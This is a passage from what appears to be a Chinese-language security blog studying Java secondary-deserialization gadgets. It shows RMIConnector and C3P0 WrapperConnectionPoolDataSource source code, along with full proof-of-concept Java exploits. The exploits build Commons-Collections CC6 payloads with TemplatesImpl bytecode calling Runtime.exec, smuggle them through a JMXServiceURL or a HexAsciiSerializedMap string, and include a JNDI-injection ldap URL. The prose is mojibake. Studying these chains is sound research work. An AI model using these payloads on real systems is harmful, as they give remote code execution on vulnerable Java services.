class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        connect(<span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(Map&lt;String,?&gt; environment)</span> &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">tracing</span> <span class="hljs-operator">=</span> logger.traceOn();<br>    <span class="hljs-type">String</span>        <span class="hljs-variable">idstr</span>   <span class="hljs-operator">=</span> (tracing?<span class="hljs-string">&quot;[&quot;</span>+<span class="hljs-built_in">this</span>.toString()+<span class="hljs-string">&quot;]&quot;</span>:<span class="hljs-literal">null</span>);<br><br>    <span class="hljs-keyword">if</span> (terminated) &#123;<br>        logger.trace(<span class="hljs-string">&quot;connect&quot;</span>,idstr + <span class="hljs-string">&quot; already closed.&quot;</span>);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Connector closed&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (connected) &#123;<br>        logger.trace(<span class="hljs-string">&quot;connect&quot;</span>,idstr + <span class="hljs-string">&quot; already connected.&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; usemap =<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;((<span class="hljs-built_in">this</span>.env==<span class="hljs-literal">null</span>) ?<br>                                        Collections.&lt;String, Object&gt;emptyMap() : <span class="hljs-built_in">this</span>.env);<br><br>        <span class="hljs-keyword">if</span> (environment != <span class="hljs-literal">null</span>) &#123;<br>            EnvHelp.checkAttributes(environment);<br>            usemap.putAll(environment);<br>        &#125;<br><br>        <span class="hljs-comment">// Get RMIServer stub from directory or URL encoding if needed.</span><br>        <span class="hljs-keyword">if</span> (tracing) logger.trace(<span class="hljs-string">&quot;connect&quot;</span>,idstr + <span class="hljs-string">&quot; finding stub...&quot;</span>);<br>        <span class="hljs-type">RMIServer</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (rmiServer!=<span class="hljs-literal">null</span>)?rmiServer:<br>        findRMIServer(jmxServiceURL, usemap);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doStart</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-comment">// Get RMIServer stub from directory or URL encoding if needed.</span><br>    RMIServer stub;<br>    <span class="hljs-keyword">try</span> &#123;<br>        stub = (rmiServer!=<span class="hljs-literal">null</span>)?rmiServer:<br>        findRMIServer(jmxServiceURL, env);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨CCé“¾çš„<code>InvokerTransformer</code>æ¥è§¦å‘<code>connect</code>ï¼ˆ<code>doStart</code>è¢«<code>protected</code>ä¿®é¥°ï¼Œä¸èƒ½ç”¨<code>InvokerTransformer</code>è§¦å‘ï¼‰ï¼š</p><p>ä»¥CC6ä¸ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIConnectorTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, templates);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        outerMap.clear();<br><br>        setValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray()));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://127.0.0.1:8888/stub/&quot;</span> + getCode()), <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;());<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">invokeTransformer</span> <span class="hljs-operator">=</span> InvokerTransformer.getInstance(<span class="hljs-string">&quot;connect&quot;</span>);<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">constantTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, constantTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(entry, <span class="hljs-string">&quot;xxx&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-comment">// å°†çœŸæ­£çš„transformersæ•°ç»„è®¾ç½®è¿›æ¥</span><br>        setValue(lazyMap,<span class="hljs-string">&quot;factory&quot;</span>, invokeTransformer);<br>        setValue(entry,<span class="hljs-string">&quot;key&quot;</span>, rmiConnector);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>findRMIServerJRMP</code>æ”¯æŒ<code>jndi</code>ã€<code>stub</code>ã€<code>iiop</code></p><p>è·Ÿè¿›<code>path</code>ä»¥<code>/jndi/</code>å¼€å¤´çš„åˆ†æ”¯ï¼š<code>findRMIServerJNDI</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> RMIServer <span class="hljs-title function_">findRMIServerJNDI</span><span class="hljs-params">(String jndiURL, Map&lt;String, ?&gt; env,</span><br><span class="hljs-params">                                    <span class="hljs-type">boolean</span> isIiop)</span><br>    <span class="hljs-keyword">throws</span> NamingException &#123;<br>    <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(EnvHelp.mapToHashtable(env));<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">objref</span> <span class="hljs-operator">=</span> ctx.lookup(jndiURL);<br>    ctx.close();<br>    <span class="hljs-comment">// ....</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç†Ÿæ‚‰çš„<code>InitialContext#lookup</code>ï¼Œæ”¹ä¸€ä¸‹<code>path</code>å°±å¯ä»¥<code>jndi</code>æ³¨å…¥äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://127.0.0.1:8888/jndi/ldap://127.0.0.1:8099/aaa&quot;</span> )<br></code></pre></td></tr></table></figure><h2 id="WrapperConnectionPoolDataSource"><a href="#WrapperConnectionPoolDataSource" class="headerlink" title="WrapperConnectionPoolDataSource"></a>WrapperConnectionPoolDataSource</h2><p><code>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource#setuserOverridesAsString</code>å¯ä»¥è·Ÿè¿›åˆ°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">C3P0ImplUtils#parseUserOverridesAsString<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">HASM_HEADER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;HexAsciiSerializedMap&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">parseUserOverridesAsString</span><span class="hljs-params">( String userOverridesAsString )</span>&#123; <br>    <span class="hljs-keyword">if</span> (userOverridesAsString != <span class="hljs-literal">null</span>)<br>    &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">hexAscii</span> <span class="hljs-operator">=</span> userOverridesAsString.substring(HASM_HEADER.length() + <span class="hljs-number">1</span>, userOverridesAsString.length() - <span class="hljs-number">1</span>);<br>        <span class="hljs-type">byte</span>[] serBytes = ByteUtils.fromHexAscii( hexAscii );<br>        <span class="hljs-keyword">return</span> Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> Collections.EMPTY_MAP;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œå­—ç¬¦æˆªå–æ˜¯ä»<code>HASM_HEADER.length() + 1</code>åˆ°<code>userOverridesAsString.length() - 1</code>ï¼Œæœ€åä¸€ä½ä¼šåƒæ‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SerializableUtils#fromByteArray<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">fromByteArray</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> &#123; <br>    <span class="hljs-type">Object</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> deserializeFromByteArray( bytes ); <br>    <span class="hljs-keyword">if</span> (out <span class="hljs-keyword">instanceof</span> IndirectlySerialized)<br>        <span class="hljs-keyword">return</span> ((IndirectlySerialized) out).getObject();<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> out;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserializeFromByteArray</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span>&#123;<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br>    <span class="hljs-keyword">return</span> in.readObject();<br>&#125;<br></code></pre></td></tr></table></figure><p>é…åˆ<code>fastjson</code>æˆ–<code>ROME</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">import</span> com.mchange.lang.ByteUtils;<br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getCC6Bytes() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;p4d0rn&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, templates);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        outerMap.clear();<br><br>        setValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">hex</span> <span class="hljs-operator">=</span> ByteUtils.toHexAscii(getCC6Bytes());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;HexAsciiSerializedMap:&quot;</span> + hex + <span class="hljs-string">&#x27;!&#x27;</span>;<br>        <span class="hljs-type">WrapperConnectionPoolDataSource</span> <span class="hljs-variable">wrapperConnectionPoolDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WrapperConnectionPoolDataSource</span>();<br>        wrapperConnectionPoolDataSource.setUserOverridesAsString(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><ul><li><p><a href="https://www.anquanke.com/post/id/256986#h3-9">https://www.anquanke.com/post/id/256986#h3-9</a></p></li><li><p><a href="https://y4tacker.github.io/2022/02/06/year/2022/2/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget%E7%9A%84%E5%AD%A6%E4%B9%A0/#hex%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E8%8A%82%E5%8A%A0%E8%BD%BD%E5%99%A8">c3p0çš„ä¸‰ä¸ªgadgetçš„å­¦ä¹  | Y4tackerâ€™s Blog</a></p></li><li><p><a href="https://p4d0rn.gitbook.io/java/others/desertwice#rmiconnector">Deserialization Twice | Java (gitbook.io)</a></p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä»å·…å³°æå®¢2023Baby_URLçœ‹äºŒæ¬¡ååºåˆ—åŒ–å’ŒJacksonåŸç”Ÿé“¾</title>
